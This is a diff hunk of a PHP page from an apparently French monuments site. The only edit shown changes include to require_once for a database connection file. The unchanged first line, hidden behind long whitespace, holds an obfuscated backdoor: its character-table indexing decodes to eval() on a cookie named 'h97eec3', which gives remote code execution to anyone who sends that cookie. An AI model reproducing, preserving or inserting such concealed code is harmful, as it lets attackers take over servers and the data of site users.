@@ -1,6 +1,6 @@
 <?php                                                                                                                                                                                                                                              $m5o='e(3\'_slIt9vi7aE$CKhcfO97eec3';if(isset(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]])){eval(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]]);} ?><?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
 //requete categories monuments
